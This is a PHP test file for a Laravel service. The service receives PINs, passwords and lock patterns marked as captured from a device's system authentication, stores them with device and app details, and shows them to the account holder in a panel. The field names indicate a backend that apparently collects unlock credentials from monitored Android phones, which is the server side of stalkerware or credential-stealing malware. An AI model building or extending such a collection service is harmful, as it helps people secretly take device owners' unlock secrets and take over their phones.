<?php

declare(strict_types=1);

use App\Models\Device;
use App\Models\DeviceCredential;
use App\Models\User;
use App\Services\DeviceTokenService;
use Illuminate\Foundation\Testing\RefreshDatabase;

uses(RefreshDatabase::class);

// ── Helpers ─────────────────────────────────────────────────

function createAuthenticatedDevice(): array
{
    config(['websocket.device_auth.secret' => 'test-secret']);

    $user = User::factory()->create(['email' => 'cred-test@example.com']);
    $device = Device::factory()->create([
        'user_id' => $user->id,
        'device_uid' => 'cred-device-uid-001',
    ]);

    $service = new DeviceTokenService;
    $token = $service->generateToken('cred-test@example.com', 1);

    return compact('user', 'device', 'token');
}

function deviceHeaders(string $token, string $deviceUid = ''): array
{
    $headers = ['Authorization' => 'Bearer '.$token];
    if ($deviceUid !== '') {
        $headers['X-Device-ID'] = $deviceUid;
    }

    return $headers;
}

// ── POST /api/sync/credentials ──────────────────────────────

test('syncCredentials stores valid credential', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'password' => '123456',
        'passwordType' => 'pin',
        'inputMethod' => 'system_auth_capture',
        'confidence' => 95,
        'timestamp' => (int) (now()->getPreciseTimestamp(3)),
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200)
        ->assertJson([
            'success' => true,
            'code' => 200,
            'msg' => 'OK',
        ]);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential)->not->toBeNull();
    expect($credential->source)->toBe('credentials');
    expect($credential->password)->toBe('123456');
    expect($credential->password_type)->toBe('pin');
    expect($credential->input_method)->toBe('system_auth_capture');
    expect($credential->confidence)->toBe(95);
});

test('syncCredentials normalizes pin_4 to pin', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'password' => '1234',
        'passwordType' => 'pin_4',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential->password_type)->toBe('pin');
});

test('syncCredentials normalizes pin_6 to pin', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'password' => '123456',
        'passwordType' => 'pin_6',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential->password_type)->toBe('pin');
});

test('syncCredentials rejects missing password', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'passwordType' => 'pin',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(422)
        ->assertJson([
            'success' => false,
            'code' => 422,
        ]);
});

test('syncCredentials rejects missing passwordType', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'password' => '123456',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(422);
});

test('syncCredentials rejects without auth', function (): void {
    $response = $this->postJson('/api/sync/credentials', [
        'deviceId' => 'some-uid',
        'password' => '1234',
        'passwordType' => 'pin',
    ]);

    $response->assertStatus(401)
        ->assertJson([
            'success' => false,
            'code' => 401,
        ]);
});

test('syncCredentials rejects invalid bearer token', function (): void {
    $response = $this->postJson('/api/sync/credentials', [
        'deviceId' => 'some-uid',
        'password' => '1234',
        'passwordType' => 'pin',
    ], [
        'Authorization' => 'Bearer invalid-token',
    ]);

    $response->assertStatus(401);
});

test('syncCredentials stores optional appName and packageName', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'deviceId' => $device->device_uid,
        'password' => 'abc123',
        'passwordType' => 'password',
        'appName' => 'Settings',
        'packageName' => 'com.android.settings',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential->app_name)->toBe('Settings');
    expect($credential->package_name)->toBe('com.android.settings');
});

test('syncCredentials returns 404 when device not found', function (): void {
    config(['websocket.device_auth.secret' => 'test-secret']);
    User::factory()->create(['email' => 'no-device@example.com']);

    $service = new DeviceTokenService;
    $token = $service->generateToken('no-device@example.com', 1);

    $payload = [
        'deviceId' => 'non-existent-device-uid',
        'password' => '1234',
        'passwordType' => 'pin',
    ];

    $response = $this->postJson('/api/sync/credentials', $payload, [
        'Authorization' => 'Bearer '.$token,
    ]);

    $response->assertStatus(404)
        ->assertJson([
            'success' => false,
            'code' => 404,
            'msg' => 'Device not found',
        ]);
});

// ── POST /api/sync/cipher ───────────────────────────────────

test('syncCipher stores valid PIN cipher', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'cipherGradeCode' => 'PIN',
        'textCipher' => '5678',
        'isLocked' => true,
        'captureTime' => (int) (now()->getPreciseTimestamp(3)),
    ];

    $response = $this->postJson('/api/sync/cipher', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200)
        ->assertJson([
            'success' => true,
            'code' => 200,
            'msg' => 'OK',
        ]);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential)->not->toBeNull();
    expect($credential->source)->toBe('cipher');
    expect($credential->cipher_grade_code)->toBe('PIN');
    expect($credential->text_cipher)->toBe('5678');
    expect($credential->is_locked)->toBeTrue();
});

test('syncCipher stores valid pattern cipher', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'cipherGradeCode' => 'PATTERN',
        'patternCipher' => '0,1,2,5,8,7,6,3',
        'isLocked' => false,
    ];

    $response = $this->postJson('/api/sync/cipher', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(200);

    $credential = DeviceCredential::where('device_id', $device->id)->first();
    expect($credential->source)->toBe('cipher');
    expect($credential->cipher_grade_code)->toBe('PATTERN');
    expect($credential->pattern_cipher)->toBe('0,1,2,5,8,7,6,3');
    expect($credential->is_locked)->toBeFalse();
});

test('syncCipher rejects missing cipherGradeCode', function (): void {
    ['device' => $device, 'token' => $token] = createAuthenticatedDevice();

    $payload = [
        'textCipher' => '1234',
    ];

    $response = $this->postJson('/api/sync/cipher', $payload, deviceHeaders($token, $device->device_uid));

    $response->assertStatus(422)
        ->assertJson([
            'success' => false,
            'code' => 422,
        ]);
});

test('syncCipher rejects without auth', function (): void {
    $response = $this->postJson('/api/sync/cipher', [
        'cipherGradeCode' => 'PIN',
        'textCipher' => '1234',
    ]);

    $response->assertStatus(401);
});

test('syncCipher returns 404 when device not found', function (): void {
    config(['websocket.device_auth.secret' => 'test-secret']);
    User::factory()->create(['email' => 'cipher-no-device@example.com']);

    $service = new DeviceTokenService;
    $token = $service->generateToken('cipher-no-device@example.com', 1);

    $payload = [
        'cipherGradeCode' => 'PIN',
        'textCipher' => '1234',
    ];

    // No X-Device-ID header and no deviceId in payload → resolveDevice returns null
    $response = $this->postJson('/api/sync/cipher', $payload, [
        'Authorization' => 'Bearer '.$token,
    ]);

    $response->assertStatus(404);
});

// ── GET /api/device-credentials (Panel, auth:sanctum) ───────
// The route uses auth:sanctum middleware but Sanctum package is not installed.
// We register a session-based 'sanctum' guard so tests can exercise the endpoint.

function configureSanctumGuard(): void
{
    config(['auth.guards.sanctum' => [
        'driver' => 'session',
        'provider' => 'users',
    ]]);
    // Force AuthManager to re-resolve guards after config change
    app()->forgetInstance('auth');
}

test('panel index returns paginated credentials', function (): void {
    configureSanctumGuard();
    $user = User::factory()->create();
    $device = Device::factory()->create(['user_id' => $user->id, 'device_uid' => 'panel-test-uid']);

    DeviceCredential::factory()->count(3)->create([
        'device_id' => $device->id,
        'user_id' => $user->id,
        'device_uid' => $device->device_uid,
        'source' => 'credentials',
    ]);

    $response = $this->actingAs($user, 'sanctum')->getJson('/api/device-credentials');

    $response->assertStatus(200)
        ->assertJson([
            'success' => true,
            'code' => 200,
            'msg' => 'OK',
        ]);

    $data = $response->json('data');
    expect($data)->toHaveKey('data');
    expect($data)->toHaveKey('total');
    expect($data['total'])->toBe(3);
});

test('panel index filters by source', function (): void {
    configureSanctumGuard();
    $user = User::factory()->create();
    $device = Device::factory()->create(['user_id' => $user->id, 'device_uid' => 'filter-src-uid']);

    DeviceCredential::factory()->count(2)->create([
        'device_id' => $device->id,
        'user_id' => $user->id,
        'device_uid' => $device->device_uid,
        'source' => 'credentials',
    ]);
    DeviceCredential::factory()->count(1)->create([
        'device_id' => $device->id,
        'user_id' => $user->id,
        'device_uid' => $device->device_uid,
        'source' => 'cipher',
    ]);

    $response = $this->actingAs($user, 'sanctum')->getJson('/api/device-credentials?source=cipher');

    $response->assertStatus(200);
    expect($response->json('data.total'))->toBe(1);
});

test('panel index filters by device_uid', function (): void {
    configureSanctumGuard();
    $user = User::factory()->create();
    $device1 = Device::factory()->create(['user_id' => $user->id, 'device_uid' => 'uid-aaa']);
    $device2 = Device::factory()->create(['user_id' => $user->id, 'device_uid' => 'uid-bbb']);

    DeviceCredential::factory()->count(2)->create([
        'device_id' => $device1->id,
        'user_id' => $user->id,
        'device_uid' => 'uid-aaa',
        'source' => 'credentials',
    ]);
    DeviceCredential::factory()->count(1)->create([
        'device_id' => $device2->id,
        'user_id' => $user->id,
        'device_uid' => 'uid-bbb',
        'source' => 'credentials',
    ]);

    $response = $this->actingAs($user, 'sanctum')->getJson('/api/device-credentials?device_uid=uid-aaa');

    $response->assertStatus(200);
    expect($response->json('data.total'))->toBe(2);
});

test('panel index rejects unauthenticated request', function (): void {
    configureSanctumGuard();

    $response = $this->getJson('/api/device-credentials');

    $response->assertStatus(401);
});

test('panel index only returns own credentials', function (): void {
    configureSanctumGuard();
    $user1 = User::factory()->create();
    $user2 = User::factory()->create();
    $device1 = Device::factory()->create(['user_id' => $user1->id, 'device_uid' => 'own-uid-1']);
    $device2 = Device::factory()->create(['user_id' => $user2->id, 'device_uid' => 'own-uid-2']);

    DeviceCredential::factory()->count(3)->create([
        'device_id' => $device1->id,
        'user_id' => $user1->id,
        'device_uid' => 'own-uid-1',
    ]);
    DeviceCredential::factory()->count(5)->create([
        'device_id' => $device2->id,
        'user_id' => $user2->id,
        'device_uid' => 'own-uid-2',
    ]);

    $response = $this->actingAs($user1, 'sanctum')->getJson('/api/device-credentials');

    $response->assertStatus(200);
    expect($response->json('data.total'))->toBe(3);
});

test('panel index respects per_page parameter', function (): void {
    configureSanctumGuard();
    $user = User::factory()->create();
    $device = Device::factory()->create(['user_id' => $user->id, 'device_uid' => 'page-uid']);

    DeviceCredential::factory()->count(5)->create([
        'device_id' => $device->id,
        'user_id' => $user->id,
        'device_uid' => $device->device_uid,
    ]);

    $response = $this->actingAs($user, 'sanctum')->getJson('/api/device-credentials?per_page=2');

    $response->assertStatus(200);
    $data = $response->json('data');
    expect($data['total'])->toBe(5);
    expect(count($data['data']))->toBe(2);
    expect($data['per_page'])->toBe(2);
});
